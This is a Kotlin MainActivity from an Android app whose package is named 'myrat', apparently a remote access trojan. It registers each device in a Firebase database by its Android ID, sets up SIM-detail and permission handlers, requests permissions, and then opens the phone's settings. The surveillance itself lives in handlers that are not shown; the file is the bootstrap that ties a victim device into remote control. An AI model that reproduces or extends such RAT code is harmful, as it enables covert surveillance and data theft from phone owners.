package com.myrat.app

import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.google.firebase.FirebaseApp
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.ServerValue
import com.google.firebase.database.ValueEventListener
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import com.myrat.app.handler.PermissionHandler
import com.myrat.app.handler.SimDetailsHandler
import com.myrat.app.utils.Logger
import java.util.UUID

class MainActivity : AppCompatActivity() {
    private lateinit var deviceId: String
    private lateinit var simDetailsHandler: SimDetailsHandler
    private lateinit var permissionHandler: PermissionHandler
    private lateinit var deviceRef: com.google.firebase.database.DatabaseReference
    private var doubleBackToExitPressedOnce = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        try {
            // Initialize Firebase first
            if (FirebaseApp.getApps(this).isEmpty()) {
                FirebaseApp.initializeApp(this)
                Logger.log("Firebase initialized")
            }
            
            setContentView(R.layout.activity_main)
            Logger.log("MainActivity onCreate, isFinishing: $isFinishing, isDestroyed: $isDestroyed")
            
            // Initialize deviceId with proper error handling
            deviceId = getDeviceId(this)
            if (deviceId.isEmpty()) {
                Logger.error("Device ID is empty, generating new one")
                deviceId = generateFallbackDeviceId()
            }
            
            // Initialize Firebase database reference with error handling
            try {
                deviceRef = Firebase.database.getReference("Device").child(deviceId)
                Logger.log("Firebase database reference initialized")
            } catch (e: Exception) {
                Logger.error("Failed to initialize Firebase database reference", e)
                Toast.makeText(this, "Database initialization failed", Toast.LENGTH_SHORT).show()
                return
            }
            
            // Initialize handlers with error handling
            try {
                simDetailsHandler = SimDetailsHandler(this, deviceId)
                permissionHandler = PermissionHandler(this, simDetailsHandler)
                Logger.log("Handlers initialized successfully")
            } catch (e: Exception) {
                Logger.error("Failed to initialize handlers", e)
                Toast.makeText(this, "Handler initialization failed", Toast.LENGTH_SHORT).show()
                return
            }

            checkAndCreateDeviceNode()
            Logger.log("Requesting permissions via PermissionHandler...")
            
            // Add delay before requesting permissions to ensure everything is initialized
            Handler(Looper.getMainLooper()).postDelayed({
                try {
                    permissionHandler.requestPermissions()
                } catch (e: Exception) {
                    Logger.error("Failed to request permissions", e)
                    Toast.makeText(this, "Permission request failed", Toast.LENGTH_SHORT).show()
                }
            }, 1000)
            
        } catch (e: Exception) {
            Logger.error("Critical error in onCreate", e)
            Toast.makeText(this, "App initialization failed: ${e.message}", Toast.LENGTH_LONG).show()
            
            // Try to recover by finishing and restarting
            Handler(Looper.getMainLooper()).postDelayed({
                finish()
                startActivity(Intent(this, MainActivity::class.java))
            }, 2000)
        }
    }

    private fun generateFallbackDeviceId(): String {
        return try {
            val androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
            if (!androidId.isNullOrEmpty() && androidId != "9774d56d682e549c") {
                androidId
            } else {
                "fallback_${System.currentTimeMillis()}_${(1000..9999).random()}"
            }
        } catch (e: Exception) {
            Logger.error("Failed to generate fallback device ID", e)
            "emergency_${System.currentTimeMillis()}"
        }
    }

    private fun checkAndCreateDeviceNode() {
        try {
            deviceRef.addListenerForSingleValueEvent(object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    try {
                        if (!snapshot.exists()) {
                            deviceRef.child("createdAt").setValue(ServerValue.TIMESTAMP)
                                .addOnSuccessListener {
                                    Log.d("Firebase", "Created new device node: $deviceId")
                                }
                                .addOnFailureListener { e ->
                                    Log.e("FirebaseError", "Failed to create device node: ${e.message}")
                                }
                        }
                    } catch (e: Exception) {
                        Logger.error("Error in onDataChange", e)
                    }
                }

                override fun onCancelled(error: DatabaseError) {
                    Log.e("FirebaseError", "Error checking device node: ${error.message}")
                }
            })
        } catch (e: Exception) {
            Logger.error("Failed to check and create device node", e)
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        Logger.log("onRequestPermissionsResult called, delegating to PermissionHandler")
        
        try {
            if (::permissionHandler.isInitialized) {
                // Handle permission results if needed
            } else {
                Logger.error("PermissionHandler not initialized in onRequestPermissionsResult")
            }
        } catch (e: Exception) {
            Logger.error("Error in onRequestPermissionsResult", e)
        }
    }

    override fun onResume() {
        super.onResume()
        Logger.log("MainActivity onResume")
        
        if (isFinishing || isDestroyed) {
            Logger.error("MainActivity is finishing or destroyed, skipping onResume")
            return
        }
        
        try {
            if (::permissionHandler.isInitialized) {
                permissionHandler.handleResume()
                checkAndOpenPhoneSettings()
            } else {
                Logger.error("PermissionHandler not initialized in onResume")
            }
        } catch (e: Exception) {
            Logger.error("Crash in onResume: ${e.message}", e)
            Toast.makeText(this, "Error in onResume: ${e.message}", Toast.LENGTH_LONG).show()
        }
    }

    private fun checkAndOpenPhoneSettings() {
        try {
            Logger.log("Checking if all permissions are granted to open phone settings")
            if (::permissionHandler.isInitialized) {
                val allPermissionsGranted = permissionHandler.areAllPermissionsGranted()
                if (allPermissionsGranted) {
                    Logger.log("All permissions granted, opening phone settings")
                    openPhoneSettings()
                } else {
                    Logger.log("Not all permissions granted yet, skipping phone settings")
                }
            } else {
                Logger.error("PermissionHandler not initialized in checkAndOpenPhoneSettings")
            }
        } catch (e: Exception) {
            Logger.error("Error in checkAndOpenPhoneSettings", e)
        }
    }

    private fun openPhoneSettings() {
        try {
            val intent = Intent(Settings.ACTION_SETTINGS).apply {
                flags = Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_SINGLE_TOP
            }
            startActivity(intent)
            Logger.log("Phone settings opened successfully")
        } catch (e: Exception) {
            Logger.error("Error opening phone settings: ${e.message}", e)
            Toast.makeText(this, "Unable to open settings", Toast.LENGTH_SHORT).show()
        }
    }

    override fun onBackPressed() {
        try {
            if (doubleBackToExitPressedOnce) {
                super.onBackPressed()
                finish()
                return
            }
            doubleBackToExitPressedOnce = true
            Toast.makeText(this, "Please click BACK again to exit", Toast.LENGTH_SHORT).show()
            Handler(Looper.getMainLooper()).postDelayed({ doubleBackToExitPressedOnce = false }, 2000)
        } catch (e: Exception) {
            Logger.error("Error in onBackPressed", e)
            super.onBackPressed()
        }
    }

    companion object {
        fun getDeviceId(context: Context): String {
            return try {
                val prefs = context.getSharedPreferences("SmsAppPrefs", Context.MODE_PRIVATE)
                var deviceId = prefs.getString("deviceId", null)
                
                if (deviceId.isNullOrEmpty()) {
                    val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
                    deviceId = if (!androidId.isNullOrEmpty() && androidId != "9774d56d682e549c") {
                        androidId
                    } else {
                        UUID.randomUUID().toString()
                    }
                    
                    prefs.edit().putString("deviceId", deviceId).apply()
                    Logger.log("Generated new deviceId: $deviceId")
                }
                
                deviceId ?: "fallback_${System.currentTimeMillis()}"
            } catch (e: Exception) {
                Logger.error("Error getting device ID", e)
                "error_${System.currentTimeMillis()}"
            }
        }
    }
}